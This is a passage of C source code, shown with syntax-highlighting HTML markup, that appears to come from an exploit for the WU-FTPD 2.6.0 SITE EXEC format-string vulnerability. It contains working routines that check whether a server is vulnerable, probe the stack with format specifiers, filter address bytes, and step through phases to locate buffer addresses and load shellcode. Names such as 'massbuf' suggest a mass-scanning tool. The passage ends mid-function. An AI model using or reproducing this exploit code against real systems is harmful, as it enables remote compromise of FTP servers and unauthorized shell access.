            </span><span class="sc11">exit</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">EXIT_FAILURE</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">int</span><span class="sc0">
</span><span class="sc11">ftp_getwlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ftpsock</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">sn</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0">     </span><span class="sc11">owlen</span><span class="sc10">,</span><span class="sc0">
            </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0">   </span><span class="sc11">popstackbuf</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0">   </span><span class="sc11">sbuf</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0">   </span><span class="sc11">rbuf</span><span class="sc10">[</span><span class="sc4">2048</span><span class="sc10">];</span><span class="sc0">


    </span><span class="sc11">memset</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">popstackbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\x00'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">popstackbuf</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xpb_align</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">--</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">popstackbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"z"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xpb_quad</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">--</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">popstackbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%.f"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xpb_double</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">--</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">popstackbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%d"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">memset</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\x00'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">sprintf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SITE EXEC 7 "</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">xpad_cat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x41414141</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">xpad_cat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x73507350</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">xpad_cat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x41414142</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">xpad_cat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x73507350</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">xpad_cat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x41414143</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">xpad_cat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x73507350</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">xpad_cat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x41414144</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">popstackbuf</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"|%p|%p|%p|%p|%p|"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">net_write</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%s\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sbuf</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">memset</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\x00'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">net_rlinet</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">20</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">exit</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">EXIT_FAILURE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">ftp_recv_until</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"200 "</span><span class="sc10">);</span><span class="sc0">


    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strstr</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"|0x73507350|"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc11">strchr</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'|'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">

        </span><span class="sc11">exit</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">EXIT_FAILURE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">sn</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strchr</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'|'</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">owlen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">sn</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">rbuf</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">owlen</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">int</span><span class="sc0">
</span><span class="sc11">esc_ok</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">addr</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0">    </span><span class="sc10">(((</span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x000000ff</span><span class="sc10">)</span><span class="sc0">     </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'%'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc10">(((</span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x0000ff00</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'%'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc10">(((</span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x00ff0000</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'%'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc10">(((</span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0xff000000</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">24</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'%'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc10">(((</span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x000000ff</span><span class="sc10">)</span><span class="sc0">     </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'\x0a'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc10">(((</span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x0000ff00</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'\x0a'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc10">(((</span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x00ff0000</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'\x0a'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc10">(((</span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0xff000000</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">24</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'\x0a'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc10">(((</span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x000000ff</span><span class="sc10">)</span><span class="sc0">     </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'\x00'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc10">(((</span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x0000ff00</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'\x00'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc10">(((</span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x00ff0000</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'\x00'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0">
        </span><span class="sc10">(((</span><span class="sc11">addr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0xff000000</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">24</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'\x00'</span><span class="sc10">))</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">



</span><span class="sc16">int</span><span class="sc0">
</span><span class="sc11">ftp_vuln</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ftpsock</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">vuln</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0">    </span><span class="sc11">resp</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">


    </span><span class="sc11">net_write</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SITE EXEC %s\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%020d|%.f%.f|"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">memset</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">resp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\x00'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">resp</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">net_rlinet</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">resp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">resp</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">20</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">fverr</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">memcmp</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">resp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"200-0000000"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">11</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">vuln</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">


    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strstr</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">resp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"|??????????????|"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">  </span><span class="sc11">exit</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">EXIT_FAILURE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">memcmp</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">resp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"500"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">memcpy</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">resp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"200 "</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">vuln</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0">
        </span><span class="sc11">ftp_recv_until</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">resp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">resp</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc6">"200 "</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">vuln</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">fverr</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">close</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">wuftp260_vuln</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">hostip</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">iptr</span><span class="sc10">)</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">vuln</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0">   </span><span class="sc11">massbuf</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0">     </span><span class="sc11">flipcoin</span><span class="sc10">,</span><span class="sc0">
            </span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0">        </span><span class="sc11">c</span><span class="sc10">;</span><span class="sc0">
        
</span><span class="sc9">#ifdef  DEBUG       
</span><span class="sc0">    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"%s: phase 1 - Check if vulnerable... \n"</span><span class="sc10">,</span><span class="sc11">hostip</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">    </span><span class="sc11">vuln</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ftp_vuln</span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">vuln</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#ifdef  DEBUG       
</span><span class="sc0">        </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"%s: phase 2 - vulnerable... \n"</span><span class="sc10">,</span><span class="sc11">hostip</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    
    
    </span><span class="sc11">FTP_tg</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FTP_targets</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">FTP_shellcode2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FTP_tg</span><span class="sc10">-&gt;</span><span class="sc11">shellcode_shell</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#ifdef  DEBUG
</span><span class="sc0">        </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"%s: phase 3 - finding buffer distance on stack... \n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hostip</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif  
</span><span class="sc0">    </span><span class="sc11">xp_bufdist</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ftp_finddist</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xp_bufdist</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">xpb_align</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xp_bufdist</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">xpb_quad</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xp_bufdist</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">xpb_double</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xp_bufdist</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#ifdef  DEBUG
</span><span class="sc0">        </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"%s: phase 4 - finding source buffer address... \n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hostip</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif      
</span><span class="sc0">    </span><span class="sc11">xp_bufaddr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ftp_findaddr</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">iptr</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xp_bufaddr</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#ifdef  DEBUG
</span><span class="sc0">        </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"%s: phase 5 - find destination buffer address...  \n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hostip</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif      
</span><span class="sc0">    </span><span class="sc11">xp_dstaddr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ftp_finddaddr</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">iptr</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xp_dstaddr</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
